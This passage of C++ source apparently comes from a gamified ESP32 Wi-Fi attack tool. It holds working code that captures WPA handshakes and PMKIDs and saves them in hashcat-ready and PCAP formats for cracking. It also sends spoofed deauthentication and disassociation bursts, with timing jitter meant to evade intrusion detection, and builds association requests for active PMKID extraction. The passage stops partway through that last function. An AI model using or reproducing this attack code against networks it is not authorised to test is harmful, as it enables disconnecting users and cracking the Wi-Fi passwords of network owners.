            if (pendingHandshakes[scanPos] &&
                memcmp(pendingHandshakes[scanPos]->bssid, bssid, 6) == 0 &&
                memcmp(pendingHandshakes[scanPos]->station, station, 6) == 0) {
                targetSlot = scanPos;
                break;
            }
            scanPos = (scanPos + 1) % PENDING_HS_SLOTS;
        }
        
        // If not found, try to allocate a new slot from static pool
        if (targetSlot >= PENDING_HS_SLOTS) {
            // Check if buffer is full (write pointer would catch read pointer)
            uint8_t nextWrite = (writePos + 1) % PENDING_HS_SLOTS;
            if (nextWrite != pendingHsRead && !pendingHsBusy[writePos] && !pendingHsAllocated[writePos]) {
                // Slot is available - acquire from static pool (no heap ops)
                targetSlot = writePos;
                
                // STATIC POOL: Point to pre-allocated slot (no malloc in callback context)
                pendingHsAllocated[targetSlot] = true;
                pendingHandshakes[targetSlot] = &pendingHsPool[targetSlot];
                
                pendingHsBusy[targetSlot] = true;  // Lock slot during init
                
                memcpy(pendingHandshakes[targetSlot]->bssid, bssid, 6);
                memcpy(pendingHandshakes[targetSlot]->station, station, 6);
                pendingHandshakes[targetSlot]->messageNum = 0;  // Deprecated field
                pendingHandshakes[targetSlot]->capturedMask = 0;
                pendingHandshakes[targetSlot]->hasPMKID = false;
                
                // Advance write pointer
                pendingHsWrite = nextWrite;
                
                pendingHsBusy[targetSlot] = false;  // Unlock after init
            }
            // else: buffer full, drop this frame (extremely rare with 4 slots)
        }
        
        // Store frame in target slot if we have one
        if (targetSlot < PENDING_HS_SLOTS && pendingHandshakes[targetSlot] && !pendingHsBusy[targetSlot]) {
            uint8_t frameIdx = messageNum - 1;
            if (frameIdx < 4) {
                pendingHsBusy[targetSlot] = true;  // Lock slot during update
                
                // EAPOL payload for hashcat 22000
                uint16_t copyLen = min((uint16_t)512, len);
                memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].data, payload, copyLen);
                pendingHandshakes[targetSlot]->frames[frameIdx].len = copyLen;
                
                // Full 802.11 frame for PCAP export
                uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
                memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
                pendingHandshakes[targetSlot]->frames[frameIdx].fullFrameLen = fullCopyLen;
                pendingHandshakes[targetSlot]->frames[frameIdx].rssi = rssi;
                
                pendingHandshakes[targetSlot]->capturedMask |= (1 << frameIdx);
                
                pendingHsBusy[targetSlot] = false;  // Unlock after update
            }
        }
    }
}

int OinkMode::findOrCreateHandshake(const uint8_t* bssid, const uint8_t* station) {
    // CALLBACK VERSION: Lookup only, no push_back
    // If not found, returns -1 and caller must queue to pendingHandshakeCreate
    NetworkRecon::enterCritical();
    int result = -1;
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            result = i;
            break;
        }
    }
    NetworkRecon::exitCritical();
    return result;  // -1 means caller must queue for creation in main thread
}

int OinkMode::findOrCreatePMKID(const uint8_t* bssid, const uint8_t* station) {
    // CALLBACK VERSION: Lookup only, no push_back
    // If not found, returns -1 and caller must queue to pendingPMKIDCreate
    NetworkRecon::enterCritical();
    int result = -1;
    for (int i = 0; i < (int)pmkids.size(); i++) {
        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
            memcmp(pmkids[i].station, station, 6) == 0) {
            result = i;
            break;
        }
    }
    NetworkRecon::exitCritical();
    return result;  // -1 means caller must queue for creation in main thread
}

// Safe versions for main thread use (does vector operations safely)
int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* station) {
    // This version is ONLY called from update() in main loop context
    // Still need spinlock to prevent race with callback reads
    
    NetworkRecon::enterCritical();
    
    // Look for existing
    for (int i = 0; i < (int)handshakes.size(); i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0 &&
            memcmp(handshakes[i].station, station, 6) == 0) {
            NetworkRecon::exitCritical();
            return i;
        }
    }
    
    // Limit check
    if (handshakes.size() >= MAX_HANDSHAKES) {
        NetworkRecon::exitCritical();
        return -1;
    }
    if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForHandshakeAdd) {
        NetworkRecon::exitCritical();
        return -1;
    }
    if (handshakes.size() >= handshakes.capacity()) {
        size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
        if (largest < HANDSHAKE_ALLOC_MIN_BLOCK) {
            NetworkRecon::exitCritical();
            return -1;
        }
    }
    
    // Create new entry
    CapturedHandshake hs = {0};
    memcpy(hs.bssid, bssid, 6);
    memcpy(hs.station, station, 6);
    hs.capturedMask = 0;
    hs.firstSeen = millis();
    hs.lastSeen = millis();
    hs.saved = false;
    hs.saveAttempts = 0;  // Start with no attempts
    hs.beaconData = nullptr;
    hs.beaconLen = 0;
    
    // Attach beacon if available
    if (beaconCaptured && beaconFrame && beaconFrameLen > 0 && beaconFrameLen <= MAX_BEACON_SIZE) {
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, bssid, 6) == 0) {
            size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
            if (largest >= beaconFrameLen) {
                hs.beaconData = (uint8_t*)malloc(beaconFrameLen);
                if (hs.beaconData) {
                    memcpy(hs.beaconData, beaconFrame, beaconFrameLen);
                    hs.beaconLen = beaconFrameLen;
                }
            }
        }
    }
    
    try {
        handshakes.push_back(hs);
    } catch (const std::bad_alloc&) {
        NetworkRecon::exitCritical();
        SDLog::log("OINK", "Failed to create handshake: out of memory");
        return -1;
    }
    int idx = handshakes.size() - 1;
    NetworkRecon::exitCritical();
    return idx;
}

int OinkMode::findOrCreatePMKIDSafe(const uint8_t* bssid, const uint8_t* station) {
    // This version is ONLY called from update() in main loop context
    // Still need spinlock to prevent race with callback reads
    
    NetworkRecon::enterCritical();
    
    // Look for existing
    for (int i = 0; i < (int)pmkids.size(); i++) {
        if (memcmp(pmkids[i].bssid, bssid, 6) == 0 &&
            memcmp(pmkids[i].station, station, 6) == 0) {
            NetworkRecon::exitCritical();
            return i;
        }
    }
    
    // Limit check
    if (pmkids.size() >= MAX_PMKIDS) {
        NetworkRecon::exitCritical();
        return -1;
    }
    if (pmkids.size() >= pmkids.capacity()) {
        size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
        if (largest < PMKID_ALLOC_MIN_BLOCK) {
            NetworkRecon::exitCritical();
            return -1;
        }
    }
    
    // Create new entry
    CapturedPMKID p = {0};
    memcpy(p.bssid, bssid, 6);
    memcpy(p.station, station, 6);
    p.timestamp = millis();
    p.saved = false;
    p.saveAttempts = 0;  // Start with no attempts
    
    try {
        pmkids.push_back(p);
    } catch (const std::bad_alloc&) {
        NetworkRecon::exitCritical();
        SDLog::log("OINK", "Failed to create PMKID: out of memory");
        return -1;
    }
    int idx = pmkids.size() - 1;
    NetworkRecon::exitCritical();
    return idx;
}

uint16_t OinkMode::getCompleteHandshakeCount() {
    uint16_t count = 0;
    for (const auto& hs : handshakes) {
        if (hs.isComplete()) count++;
    }
    return count;
}

// LOCKING state queries for display
bool OinkMode::isLocking() {
    return running && autoState == AutoState::LOCKING;
}

const char* OinkMode::getTargetSSID() {
    return targetCacheValid ? targetSSIDCache : "";
}

uint8_t OinkMode::getTargetClientCount() {
    return targetCacheValid ? targetClientCountCache : 0;
}

const uint8_t* OinkMode::getTargetBSSID() {
    return targetCacheValid ? targetBssidCache : nullptr;
}

bool OinkMode::isTargetHidden() {
    return targetCacheValid ? targetHiddenCache : false;
}

void OinkMode::autoSaveCheck() {
    // Check if SD card is available
    if (!Config::isSDAvailable()) {
        return;
    }
    
    // Check if there's anything to save before pausing promiscuous
    bool hasUnsavedHS = false;
    bool hasUnsavedPMKID = false;
    
    for (const auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved && hs.saveAttempts < 3) {
            hasUnsavedHS = true;
            break;
        }
    }
    for (const auto& p : pmkids) {
        if (!p.saved && p.ssid[0] != 0) {
            hasUnsavedPMKID = true;
            break;
        }
    }
    
    if (!hasUnsavedHS && !hasUnsavedPMKID) {
        return;  // Nothing to save, skip promiscuous pause
    }
    
    // Pause promiscuous mode for safe SD access (avoids SPI bus contention)
    // Brief ~50-100ms gap is acceptable - we just captured what we needed
    bool pausedByUs = false;
    if (NetworkRecon::isRunning()) {
        NetworkRecon::pause();
        pausedByUs = true;
    }
    delay(5);  // Let SPI bus settle
    
    // Save any unsaved complete handshakes
    for (auto& hs : handshakes) {
        if (hs.isComplete() && !hs.saved && hs.saveAttempts < 3) {
            // Check backoff timer (exponential: 0s, 2s, 5s, then give up)
            static const uint32_t backoffMs[] = {0, 2000, 5000};
            uint32_t timeSinceCapture = millis() - hs.lastSeen;
            if (timeSinceCapture < backoffMs[hs.saveAttempts]) {
                continue;  // Wait for backoff period
            }
            
            const char* handshakesDir = SDLayout::handshakesDir();

            // Generate filename
            char filename[64];
            snprintf(filename, sizeof(filename), "%s/%02X%02X%02X%02X%02X%02X.pcap",
                    handshakesDir,
                    hs.bssid[0], hs.bssid[1], hs.bssid[2],
                    hs.bssid[3], hs.bssid[4], hs.bssid[5]);
            
            // Ensure directory exists
            if (!SD.exists(handshakesDir)) {
                if (!SD.mkdir(handshakesDir)) {
                    SDLog::log("OINK", "Failed to create handshakes directory");
                    continue;  // Skip this handshake if we can't create directory
                }
            }
            
            // Save PCAP (for wireshark/manual analysis)
            bool pcapOk = saveHandshakePCAP(hs, filename);
            
            // Save 22000 format (hashcat-ready, no conversion needed)
            char filename22000[64];
            snprintf(filename22000, sizeof(filename22000), "%s/%02X%02X%02X%02X%02X%02X_hs.22000",
                    handshakesDir,
                    hs.bssid[0], hs.bssid[1], hs.bssid[2],
                    hs.bssid[3], hs.bssid[4], hs.bssid[5]);
            bool hs22kOk = saveHandshake22000(hs, filename22000);
            
            if (pcapOk || hs22kOk) {
                hs.saved = true;
                SDLog::log("OINK", "Handshake saved: %s (pcap:%s 22000:%s)", 
                           hs.ssid, pcapOk ? "OK" : "FAIL", hs22kOk ? "OK" : "FAIL");
                
                // Save SSID to companion .txt file for later reference
                char txtFilename[64];
                snprintf(txtFilename, sizeof(txtFilename), "%s/%02X%02X%02X%02X%02X%02X.txt",
                        handshakesDir,
                        hs.bssid[0], hs.bssid[1], hs.bssid[2],
                        hs.bssid[3], hs.bssid[4], hs.bssid[5]);
                if (SD.exists(txtFilename)) {
                    if (!SD.remove(txtFilename)) {
                        SDLog::log("OINK", "Failed to remove old txt file: %s", txtFilename);
                    }
                }
                File txtFile = SD.open(txtFilename, FILE_WRITE);
                if (txtFile) {
                    if (txtFile.println(hs.ssid) == 0) {
                        SDLog::log("OINK", "Failed to write to txt file: %s", txtFilename);
                    }
                    txtFile.close();
                }
            } else {
                // Failed - increment attempt counter
                hs.saveAttempts++;
                if (hs.saveAttempts >= 3) {
                    // Give up after 3 attempts to prevent infinite retry
                    SDLog::log("OINK", "Save failed after 3 attempts: %s (kept in RAM)", hs.ssid);
                    hs.saved = true;  // Mark as done to stop retries (data still in RAM)
                }
            }
            
            // Yield to watchdog/scheduler after each save (prevents WDT during mass saves)
            delay(1);
        }
    }
    
    // Also save any unsaved PMKIDs
    saveAllPMKIDs();
    
    // Resume promiscuous mode if we paused it
    if (pausedByUs) {
        NetworkRecon::resume();
    }
}

// PCAP file format structures
#pragma pack(push, 1)
struct PCAPHeader {
    uint32_t magic;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t linktype;
};

struct PCAPPacketHeader {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
};
#pragma pack(pop)

void OinkMode::writePCAPHeader(fs::File& f) {
    PCAPHeader hdr = {
        .magic = 0xA1B2C3D4,      // PCAP magic
        .version_major = 2,
        .version_minor = 4,
        .thiszone = 0,
        .sigfigs = 0,
        .snaplen = 65535,
        .linktype = 127           // LINKTYPE_IEEE802_11_RADIOTAP (with radiotap header)
    };
    f.write((uint8_t*)&hdr, sizeof(hdr));
}

// Minimal radiotap header (8 bytes) - no optional fields
static const uint8_t RADIOTAP_HEADER[] = {
    0x00,       // Header revision
    0x00,       // Header pad
    0x08, 0x00, // Header length (8, little-endian)
    0x00, 0x00, 0x00, 0x00  // Present flags (no optional fields)
};

void OinkMode::writePCAPPacket(fs::File& f, const uint8_t* data, uint16_t len, uint32_t ts) {
    // Total packet length = radiotap header + 802.11 frame
    uint32_t totalLen = sizeof(RADIOTAP_HEADER) + len;
    
    PCAPPacketHeader pkt = {
        .ts_sec = ts / 1000,
        .ts_usec = (ts % 1000) * 1000,
        .incl_len = totalLen,
        .orig_len = totalLen
    };
    f.write((uint8_t*)&pkt, sizeof(pkt));
    
    // Write radiotap header
    f.write(RADIOTAP_HEADER, sizeof(RADIOTAP_HEADER));
    
    // Write 802.11 frame data
    f.write(data, len);
}

bool OinkMode::saveHandshakePCAP(const CapturedHandshake& hs, const char* path) {
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    
    writePCAPHeader(f);
    
    int packetCount = 0;
    
    // Write beacon frame first (required for hashcat to crack)
    // Try per-handshake beacon first, fall back to global
    if (hs.hasBeacon()) {
        writePCAPPacket(f, hs.beaconData, hs.beaconLen, hs.firstSeen);
        packetCount++;
    } else if (beaconCaptured && beaconFrame && beaconFrameLen > 0) {
        // Verify global beacon is from same BSSID as handshake
        const uint8_t* beaconBssid = beaconFrame + 16;
        if (memcmp(beaconBssid, hs.bssid, 6) == 0) {
            writePCAPPacket(f, beaconFrame, beaconFrameLen, hs.firstSeen);
            packetCount++;
        }
    }
    
    // Write EAPOL frames to PCAP
    for (int i = 0; i < 4; i++) {
        if (!(hs.capturedMask & (1 << i))) continue;
        
        const EAPOLFrame& frame = hs.frames[i];
        if (frame.len == 0) continue;
        
        // Prefer stored fullFrame (real 802.11 capture) over reconstruction
        if (frame.fullFrameLen > 0 && frame.fullFrameLen <= 300) {
            // Use the actual captured 802.11 frame (best quality)
            writePCAPPacket(f, frame.fullFrame, frame.fullFrameLen, frame.timestamp);
            packetCount++;
        } else {
            // Fallback: reconstruct frame from EAPOL payload (legacy path)
            uint8_t pkt[600];
            uint16_t pktLen = 0;
            
            // 802.11 Data frame header (24 bytes)
            pkt[0] = 0x08;
            pkt[2] = 0x00; pkt[3] = 0x00;  // Duration
            
            // Addresses depend on message direction
            if (i == 0 || i == 2) {  // M1, M3: AP->Station (FromDS=1, ToDS=0)
                pkt[1] = 0x02;
                memcpy(pkt + 4, hs.station, 6);
                memcpy(pkt + 10, hs.bssid, 6);
                memcpy(pkt + 16, hs.bssid, 6);
            } else {  // M2, M4: Station->AP (ToDS=1, FromDS=0)
                pkt[1] = 0x01;
                memcpy(pkt + 4, hs.bssid, 6);
                memcpy(pkt + 10, hs.station, 6);
                memcpy(pkt + 16, hs.bssid, 6);
            }
            
            pkt[22] = 0x00; pkt[23] = 0x00;  // Sequence
            pktLen = 24;
            
            // LLC/SNAP header (8 bytes)
            pkt[24] = 0xAA; pkt[25] = 0xAA; pkt[26] = 0x03;
            pkt[27] = 0x00; pkt[28] = 0x00; pkt[29] = 0x00;
            pkt[30] = 0x88; pkt[31] = 0x8E;
            pktLen = 32;
            
            // EAPOL data
            if (32 + frame.len > sizeof(pkt)) continue;
            memcpy(pkt + 32, frame.data, frame.len);
            pktLen += frame.len;
            
            writePCAPPacket(f, pkt, pktLen, frame.timestamp);
            packetCount++;
        }
    }
    
    f.close();
    return true;
}

bool OinkMode::saveAllHandshakes() {
    bool success = true;
    autoSaveCheck();  // This saves any unsaved ones
    return success;
}

bool OinkMode::savePMKID22000(const CapturedPMKID& p, const char* path) {
    // Save PMKID in hashcat 22000 format:
    // WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR
    
    // Safety check: don't save all-zero PMKIDs (invalid/empty)
    bool allZeros = true;
    for (int i = 0; i < 16; i++) {
        if (p.pmkid[i] != 0) { allZeros = false; break; }
    }
    if (allZeros) {
        return false;
    }
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    
    // Build the hash line
    // PMKID (16 bytes as 32 hex chars)
    char pmkidHex[33];
    for (int i = 0; i < 16; i++) {
        sprintf(pmkidHex + i*2, "%02x", p.pmkid[i]);
    }
    
    // MAC_AP (6 bytes as 12 hex chars, no colons)
    char macAP[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            p.bssid[0], p.bssid[1], p.bssid[2], 
            p.bssid[3], p.bssid[4], p.bssid[5]);
    
    // MAC_CLIENT (6 bytes as 12 hex chars)
    char macClient[13];
    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
            p.station[0], p.station[1], p.station[2], 
            p.station[3], p.station[4], p.station[5]);
    
    // ESSID (hex-encoded, max 32 chars = 64 hex + null)
    char essidHex[65];
    int ssidLen = strlen(p.ssid);
    if (ssidLen > 32) ssidLen = 32;  // Cap to max SSID length
    for (int i = 0; i < ssidLen; i++) {
        sprintf(essidHex + i*2, "%02x", (uint8_t)p.ssid[i]);
    }
    essidHex[ssidLen * 2] = 0;
    
    // Write: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***01
    // MESSAGEPAIR 01 = PMKID taken from AP
    f.printf("WPA*01*%s*%s*%s*%s***01\n", pmkidHex, macAP, macClient, essidHex);
    
    f.close();
    return true;
}

bool OinkMode::saveHandshake22000(const CapturedHandshake& hs, const char* path) {
    // Save handshake in hashcat 22000 format:
    // WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*NONCE_AP*EAPOL_CLIENT*MESSAGEPAIR
    //
    // Supported message pairs:
    // - 0x00: M1+M2 (ANonce from M1, EAPOL+MIC from M2) - most common
    // - 0x02: M2+M3 (ANonce from M3, EAPOL+MIC from M2) - fallback
    
    uint8_t msgPair = hs.getMessagePair();
    if (msgPair == 0xFF) {
        return false;
    }
    
    // Determine which frames to use
    const EAPOLFrame* nonceFrame = nullptr;  // M1 or M3 (contains ANonce)
    const EAPOLFrame* eapolFrame = nullptr;  // M2 (contains MIC + full EAPOL)
    
    if (msgPair == 0x00) {
        // M1+M2: ANonce from M1, EAPOL from M2
        nonceFrame = &hs.frames[0];  // M1
        eapolFrame = &hs.frames[1];  // M2
    } else {
        // M2+M3: ANonce from M3, EAPOL from M2
        nonceFrame = &hs.frames[2];  // M3
        eapolFrame = &hs.frames[1];  // M2
    }
    
    // MIC field is at offset 81-96 (16 bytes), so we need len >= 97 to read it safely
    if (nonceFrame->len < 51 || eapolFrame->len < 97) {
        return false;
    }
    
    File f = SD.open(path, FILE_WRITE);
    if (!f) {
        return false;
    }
    
    // Extract MIC from M2 EAPOL frame (offset 81, 16 bytes)
    // EAPOL-Key: ver(1)+type(1)+len(2)+desc(1)+keyinfo(2)+keylen(2)+replay(8)+nonce(32)+iv(16)+rsc(8)+reserved(8)+MIC(16)
    // Offsets: 0-3=EAPOL hdr, 4=desc, 5-6=keyinfo, 7-8=keylen, 9-16=replay, 17-48=nonce, 49-64=iv, 65-72=rsc, 73-80=reserved, 81-96=MIC
    char micHex[33];
    for (int i = 0; i < 16; i++) {
        sprintf(micHex + i*2, "%02x", eapolFrame->data[81 + i]);
    }
    
    // MAC_AP (6 bytes as 12 hex chars)
    char macAP[13];
    sprintf(macAP, "%02x%02x%02x%02x%02x%02x",
            hs.bssid[0], hs.bssid[1], hs.bssid[2],
            hs.bssid[3], hs.bssid[4], hs.bssid[5]);
    
    // MAC_CLIENT (6 bytes as 12 hex chars)
    char macClient[13];
    sprintf(macClient, "%02x%02x%02x%02x%02x%02x",
            hs.station[0], hs.station[1], hs.station[2],
            hs.station[3], hs.station[4], hs.station[5]);
    
    // ESSID (hex-encoded, max 32 chars = 64 hex + null)
    char essidHex[65];
    int ssidLen = strlen(hs.ssid);
    if (ssidLen > 32) ssidLen = 32;  // Cap to max SSID length
    for (int i = 0; i < ssidLen; i++) {
        sprintf(essidHex + i*2, "%02x", (uint8_t)hs.ssid[i]);
    }
    essidHex[ssidLen * 2] = 0;
    
    // ANonce from M1 or M3 (offset 17, 32 bytes)
    char nonceHex[65];
    for (int i = 0; i < 32; i++) {
        sprintf(nonceHex + i*2, "%02x", nonceFrame->data[17 + i]);
    }
    
    // Full EAPOL frame from M2 (hex-encoded)
    // The EAPOL frame length is in bytes 2-3 (big-endian) + 4 bytes header
    uint16_t eapolLen = (eapolFrame->data[2] << 8) | eapolFrame->data[3];
    eapolLen += 4;  // Add EAPOL header (version + type + length)
    if (eapolLen > eapolFrame->len) eapolLen = eapolFrame->len;
    
    // Allocate buffer for hex-encoded EAPOL (2 chars per byte)
    // Max EAPOL is 512 bytes = 1024 hex chars + null
    static char eapolHex[1025];
    if (eapolLen * 2 + 1 > sizeof(eapolHex)) {
        f.close();
        return false;
    }
    
    // Zero the MIC in EAPOL copy for hashcat (MIC at offset 81)
    // Work on a copy to avoid modifying original
    uint8_t eapolCopy[512];
    memcpy(eapolCopy, eapolFrame->data, eapolLen);
    memset(eapolCopy + 81, 0, 16);  // Zero MIC field
    
    for (int i = 0; i < eapolLen; i++) {
        sprintf(eapolHex + i*2, "%02x", eapolCopy[i]);
    }
    eapolHex[eapolLen * 2] = 0;
    
    // Write: WPA*02*MIC*MAC_AP*MAC_CLIENT*ESSID*ANONCE*EAPOL*MESSAGEPAIR
    f.printf("WPA*02*%s*%s*%s*%s*%s*%s*%02x\n",
             micHex, macAP, macClient, essidHex, nonceHex, eapolHex, msgPair);
    
    f.close();
    
    return true;
}

bool OinkMode::saveAllPMKIDs() {
    if (!Config::isSDAvailable()) return false;
    
    const char* handshakesDir = SDLayout::handshakesDir();

    // Ensure directory exists
    if (!SD.exists(handshakesDir)) {
        if (!SD.mkdir(handshakesDir)) {
            SDLog::log("OINK", "Failed to create handshakes directory for PMKID");
            return false;
        }
    }
    
    bool success = true;
    for (auto& p : pmkids) {
        // SSID backfill: In passive mode (DO NO HAM), M1 frames may arrive before
        // beacon, so SSID lookup fails at capture time. Try again before saving.
        // SSID is REQUIRED for PMKID cracking - it's the salt for PBKDF2(passphrase, SSID).
        if (p.ssid[0] == 0) {
            for (const auto& net : networks()) {
                if (memcmp(net.bssid, p.bssid, 6) == 0 && net.ssid[0] != 0) {
                    strncpy(p.ssid, net.ssid, 32);
                    p.ssid[32] = 0;
                    break;
                }
            }
        }
        
        // SSID is required - PMK = PBKDF2(passphrase, SSID), so no SSID = uncrackable
        // Keep in memory for later retry if SSID is found
        if (!p.saved && p.ssid[0] != 0 && p.saveAttempts < 3) {
            // Skip invalid all-zero PMKIDs (don't count as attempt)
            bool allZeros = true;
            for (int i = 0; i < 16; i++) {
                if (p.pmkid[i] != 0) { allZeros = false; break; }
            }
            if (allZeros) {
                p.saved = true;
                continue;
            }

            // Check backoff timer (exponential: 0s, 2s, 5s, then give up)
            static const uint32_t backoffMs[] = {0, 2000, 5000};
            uint32_t timeSinceCapture = millis() - p.timestamp;
            if (timeSinceCapture < backoffMs[p.saveAttempts]) {
                continue;  // Wait for backoff period
            }
            
            // Use BSSID-based filename in /handshakes/ (same as handshakes, but .22000 extension)
            char filename[64];
            snprintf(filename, sizeof(filename), "%s/%02X%02X%02X%02X%02X%02X.22000",
                     handshakesDir,
                     p.bssid[0], p.bssid[1], p.bssid[2],
                     p.bssid[3], p.bssid[4], p.bssid[5]);
            
            if (savePMKID22000(p, filename)) {
                p.saved = true;
                SDLog::log("OINK", "PMKID saved: %s", p.ssid);
                
                // Save SSID to companion .txt file (same pattern as handshakes)
                char txtFilename[64];
                snprintf(txtFilename, sizeof(txtFilename), "%s/%02X%02X%02X%02X%02X%02X_pmkid.txt",
                         handshakesDir,
                         p.bssid[0], p.bssid[1], p.bssid[2],
                         p.bssid[3], p.bssid[4], p.bssid[5]);
                // Delete existing file first to ensure clean overwrite (FILE_WRITE appends on ESP32)
                if (SD.exists(txtFilename)) {
                    if (!SD.remove(txtFilename)) {
                        SDLog::log("OINK", "Failed to remove old PMKID txt file: %s", txtFilename);
                    }
                }
                File txtFile = SD.open(txtFilename, FILE_WRITE);
                if (txtFile) {
                    if (txtFile.println(p.ssid) == 0) {
                        SDLog::log("OINK", "Failed to write to PMKID txt file: %s", txtFilename);
                    }
                    txtFile.close();
                }
            } else {
                // Failed - increment attempt counter
                p.saveAttempts++;
                if (p.saveAttempts >= 3) {
                    // Give up after 3 attempts to prevent infinite retry
                    SDLog::log("OINK", "PMKID save failed after 3 attempts: %s (kept in RAM)", p.ssid);
                    p.saved = true;  // Mark as done to stop retries (data still in RAM)
                }
                success = false;
            }
            
            // Yield to watchdog/scheduler after each save
            delay(1);
        }
    }
    return success;
}

void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Deauth frame structure
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,  // Frame Control: Deauth
        0x00, 0x00,  // Duration
        // Address 1 (Destination)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        // Address 2 (Source/BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // Address 3 (BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,  // Sequence
        0x07, 0x00   // Reason code
    };
    
    memcpy(deauthPacket + 4, station, 6);
    memcpy(deauthPacket + 10, bssid, 6);
    memcpy(deauthPacket + 16, bssid, 6);
    deauthPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
}

void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
    // Send burst of deauth frames for more effective disconnection
    // Random jitter between frames makes it harder for WIDS to detect pattern
    // Jitter is modified by buffs/debuffs (base 5ms, debuffed 7ms)
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t jitterMax = SwineStats::getDeauthJitterMax();
    
    // Mark session as having deauthed (for Silent Witness achievement tracking)
    SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
    sess.everDeauthed = true;
    
    for (uint8_t i = 0; i < count; i++) {
        // AP -> Client (pretend to be AP)
        sendDeauthFrame(bssid, station, 7);  // Class 3 frame from non-associated station
        
        // Random jitter 1-Nms between forward and reverse frames (buff-modified)
        delay(random(1, jitterMax + 1));
        
        // Client -> AP (pretend to be client) - bidirectional attack
        if (memcmp(station, broadcast, 6) != 0) {
            // Only if not broadcast - swap source/dest
            uint8_t reversePacket[26] = {
                0xC0, 0x00,  // Frame Control: Deauth
                0x00, 0x00,  // Duration
            };
            memcpy(reversePacket + 4, bssid, 6);     // To AP
            memcpy(reversePacket + 10, station, 6);  // From Client
            memcpy(reversePacket + 16, bssid, 6);    // BSSID
            reversePacket[22] = 0x00;
            reversePacket[23] = 0x00;
            reversePacket[24] = 1;  // Unspecified reason
            reversePacket[25] = 0x00;
            esp_wifi_80211_tx(WIFI_IF_STA, reversePacket, sizeof(reversePacket), false);
            
            // Jitter between iterations (buff-modified)
            if (i < count - 1) {
                delay(random(1, jitterMax + 1));
            }
        }
    }
}

void OinkMode::sendDisassocFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
    // Disassociation frame - some clients respond better to this
    uint8_t disassocPacket[26] = {
        0xA0, 0x00,  // Frame Control: Disassoc (0xA0 instead of 0xC0)
        0x00, 0x00,  // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // DA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
        0x00, 0x00,  // Sequence
        0x08, 0x00   // Reason code (Disassociated because station leaving)
    };
    
    memcpy(disassocPacket + 4, station, 6);
    memcpy(disassocPacket + 10, bssid, 6);
    memcpy(disassocPacket + 16, bssid, 6);
    disassocPacket[24] = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), false);
}

void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
    // 802.11 Association Request for active PMKID extraction
    uint8_t assocReq[128];
    memset(assocReq, 0, sizeof(assocReq));
    
    // Frame Control: Type=Management(0), Subtype=Association Request(0)
    assocReq[0] = 0x00;
    assocReq[1] = 0x00;
    
    // Duration
    assocReq[2] = 0x00;
    assocReq[3] = 0x00;
    
    // Address 1: Destination (AP BSSID)
    memcpy(assocReq + 4, bssid, 6);
    
    // Address 2: Source (our MAC)
    uint8_t ourMac[6];
    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
    memcpy(assocReq + 10, ourMac, 6);
    
    // Address 3: BSSID
    memcpy(assocReq + 16, bssid, 6);
    
    // Sequence control
    assocReq[22] = 0x00;
    assocReq[23] = 0x00;
    
    // Frame body starts at offset 24
    uint16_t bodyOffset = 24;
    
    // Capability Info: ESS + Short Preamble
    assocReq[bodyOffset++] = 0x01;
    assocReq[bodyOffset++] = 0x04;
    
    // Listen Interval
    assocReq[bodyOffset++] = 0x0A;
    assocReq[bodyOffset++] = 0x00;
    
    // SSID IE (Tag 0)
    assocReq[bodyOffset++] = 0x00;
    assocReq[bodyOffset++] = ssidLen;
    memcpy(assocReq + bodyOffset, ssid, ssidLen);
    bodyOffset += ssidLen;
    
    // Supported Rates IE (Tag 1)
    assocReq[bodyOffset++] = 0x01;
    assocReq[bodyOffset++] = 0x08;
    assocReq[bodyOffset++] = 0x82;  // 1 Mbps basic
    assocReq[bodyOffset++] = 0x84;  // 2 Mbps basic
    assocReq[bodyOffset++] = 0x8B;  // 5.5 Mbps basic
    assocReq[bodyOffset++] = 0x96;  // 11 Mbps basic
